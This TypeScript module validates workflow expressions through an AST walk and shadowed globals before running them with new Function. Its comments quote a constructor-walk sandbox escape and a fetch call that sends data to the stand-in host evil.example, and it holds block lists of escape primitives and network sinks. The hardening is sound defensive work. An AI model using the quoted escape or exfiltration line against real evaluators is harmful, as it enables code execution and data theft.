/**
 * Safe expression evaluator for workflow nodes.
 *
 * Parses the expression into an AST and walks the full tree, rejecting any
 * construct that could escape the `new Function` sandbox and reach Node.js
 * internals (prototype-pollution / constructor-walk RCE). Only after the AST
 * passes do we build the function via `new Function`.
 *
 * This replaces an earlier regex denylist that was trivially bypassable with
 * dynamic property access such as
 *   `this["cons" + "tructor"]["cons" + "tructor"]("return process")()`.
 * The AST gate blocks that class of escape at the structural level.
 *
 * Parser note: this module uses `@babel/parser` rather than `acorn`. Both
 * emit an ESTree-shaped AST (Identifier / MemberExpression / CallExpression /
 * ThisExpression / Literal, …) so the hand-rolled walk below is parser-
 * agnostic. acorn is not reliably resolvable under vitest in this workspace
 * (its package files are not installed), whereas @babel/parser is — and it is
 * a strict superset for our purposes. We avoid any namespace/visitor-table
 * import (e.g. `import * as walk from 'acorn-walk'`), which breaks under
 * vitest's full-graph module loading; instead we recurse over every own
 * property of every node, visiting any object that carries a string `type`.
 */

import { parse } from '@babel/parser';

/**
 * Names that must never appear as identifiers, member property names, or
 * string literal values. These are the building blocks of every known
 * `new Function` sandbox escape.
 */
const BANNED_NAMES = new Set([
  'constructor',
  '__proto__',
  'prototype',
  'eval',
  'Function',
  'require',
  'process',
  'globalThis',
  'global',
  'import',
  'module',
  'exports',
  'Reflect',
  'Proxy',
  'WebAssembly',
  'this',
  'arguments',
]);

export class UnsafeExpressionError extends Error {
  constructor(matched: string) {
    super(`Blocked unsafe expression token: ${matched}`);
    this.name = 'UnsafeExpressionError';
  }
}

/**
 * Hand-rolled recursive AST walk. We deliberately do NOT use a visitor-table
 * helper (acorn-walk / @babel/traverse): those break or pull heavy graphs
 * under vitest's full-graph module loading. Recursing over every own property
 * also means new/unknown syntax cannot smuggle past us — anything we don't
 * explicitly model is still descended into and any banned Identifier/Literal
 * inside it is caught.
 */
function walkAndValidate(node: unknown): void {
  if (node === null || typeof node !== 'object') return;

  if (Array.isArray(node)) {
    for (const child of node) walkAndValidate(child);
    return;
  }

  const obj = node as Record<string, unknown>;
  const type = typeof obj.type === 'string' ? (obj.type as string) : undefined;

  if (type) {
    checkNode(type, obj);
  }

  for (const key of Object.keys(obj)) {
    // Skip Babel bookkeeping fields that contain no executable syntax.
    if (key === 'loc' || key === 'start' || key === 'end' || key === 'range') continue;
    walkAndValidate(obj[key]);
  }
}

function checkNode(type: string, obj: Record<string, unknown>): void {
  switch (type) {
    case 'ThisExpression':
      throw new UnsafeExpressionError('this');

    case 'MetaProperty':
      // import.meta / new.target
      throw new UnsafeExpressionError('meta-property');

    case 'Import': // @babel callee for `import(...)`
    case 'ImportExpression':
      throw new UnsafeExpressionError('import()');

    case 'WithStatement':
      throw new UnsafeExpressionError('with');

    case 'Identifier':
    case 'PrivateName':
    case 'PrivateIdentifier': {
      // Babel nests the name under `id` for PrivateName; handle both.
      const name =
        (typeof obj.name === 'string' && obj.name) ||
        (obj.id && typeof (obj.id as Record<string, unknown>).name === 'string'
          ? ((obj.id as Record<string, unknown>).name as string)
          : undefined);
      if (name && BANNED_NAMES.has(name)) throw new UnsafeExpressionError(name);
      break;
    }

    case 'StringLiteral': // @babel string literal
      if (typeof obj.value === 'string' && BANNED_NAMES.has(obj.value)) {
        throw new UnsafeExpressionError(obj.value);
      }
      break;

    case 'Literal': // ESTree literal (also numbers/booleans — only strings matter)
      if (typeof obj.value === 'string' && BANNED_NAMES.has(obj.value)) {
        throw new UnsafeExpressionError(obj.value);
      }
      break;

    case 'MemberExpression':
    case 'OptionalMemberExpression': {
      const computed = obj.computed === true;
      const property = obj.property as Record<string, unknown> | undefined;

      if (!computed) {
        // Static member access: foo.constructor — reject banned property names.
        if (property && property.type === 'Identifier') {
          const name = property.name as string;
          if (BANNED_NAMES.has(name)) throw new UnsafeExpressionError(name);
        }
      } else {
        // Computed member access: foo[expr]. Only allow a static string/number
        // literal as the key — anything else (concatenation, identifier, call)
        // is rejected so `this["cons"+"tructor"]` can't slip through. The
        // literal's value is independently checked by the Literal case above.
        const isStaticLiteral =
          property &&
          (property.type === 'Literal' || property.type === 'StringLiteral' || property.type === 'NumericLiteral');
        if (!isStaticLiteral) {
          throw new UnsafeExpressionError('computed member access');
        }
        if (typeof property.value === 'string' && BANNED_NAMES.has(property.value)) {
          throw new UnsafeExpressionError(property.value);
        }
      }
      break;
    }

    case 'NewExpression':
    case 'CallExpression':
    case 'OptionalCallExpression': {
      const callee = obj.callee as Record<string, unknown> | undefined;
      if (callee && callee.type === 'Identifier') {
        const name = callee.name as string;
        if (name === 'Function' || name === 'eval') {
          throw new UnsafeExpressionError(name);
        }
      }
      break;
    }

    default:
      break;
  }
}

/**
 * Validates that an expression contains no construct that could escape the
 * `new Function` sandbox and access Node.js internals.
 *
 * Throws `UnsafeExpressionError` if a banned construct is found, or a plain
 * Error if the expression is not parseable.
 */
export function validateExpression(expression: string): void {
  // Parse the body exactly as `new Function` will execute it: as the body of a
  // function. This makes `return`, `const`, multi-statement bodies, and bare
  // trailing expressions all legal to parse — matching how transform /
  // conditional / validator / loop pass their bodies through `safeFunction`.
  const ast = parse(`(function(){${expression}\n})`, { sourceType: 'script' });
  walkAndValidate(ast);
}

/**
 * Globals shadowed to `undefined` inside every evaluated body.
 *
 * The AST gate above stops a `constructor`-walk escape to Node internals, but it
 * is a DENYLIST of names — and it never blocked the network sinks that Node 18+
 * exposes as plain globals. `return fetch('https://evil.example/?x=' + json.k)`
 * contains no banned identifier, so it parsed clean and then ran server-side
 * from the trusted process, outside the SSRF guard entirely.
 *
 * That matters most for expressions an LLM authors and we STORE: an
 * `api_integrations` output expression (see src/lib/apis/integrations.ts) is
 * written by the model and re-evaluated on every call. Shadowing is a whitelist-
 * shaped defence — the names are bound as parameters, so they are `undefined`
 * in the body no matter how they are spelled or computed.
 *
 * Deliberately NOT shadowed: Math, JSON, Date, Number, String, Array, Object,
 * parseInt/parseFloat, isNaN — the arithmetic and formatting that legitimate
 * conditional/transform/output expressions are built from.
 */
const SHADOWED_GLOBALS = [
  'fetch',
  'XMLHttpRequest',
  'WebSocket',
  'EventSource',
  'Request',
  'Response',
  'navigator',
  'require',
  'process',
  'globalThis',
  'global',
  'Buffer',
  'module',
  'exports',
  'eval',
  'Function',
  'import',
] as const;

/**
 * Build a Function from an expression after safety validation.
 * The returned function receives the listed `argNames` as parameters; the
 * network/module globals in SHADOWED_GLOBALS are additionally bound to
 * `undefined` so an evaluated body cannot reach them.
 */
export function safeFunction(argNames: string[], body: string): Function {
  validateExpression(body);
  // `import` is a reserved word and cannot be a parameter name; the AST gate
  // already bans it as an identifier/literal, so skip it here.
  const shadows = SHADOWED_GLOBALS.filter((n) => n !== 'import' && !argNames.includes(n));
  const fn = new Function(...argNames, ...shadows, body) as (...args: unknown[]) => unknown;
  // Wrap so callers keep calling with only their own args — the shadow
  // parameters are left unpassed and are therefore `undefined`.
  return function (this: unknown, ...args: unknown[]) {
    return fn.apply(this, args.slice(0, argNames.length));
  };
}
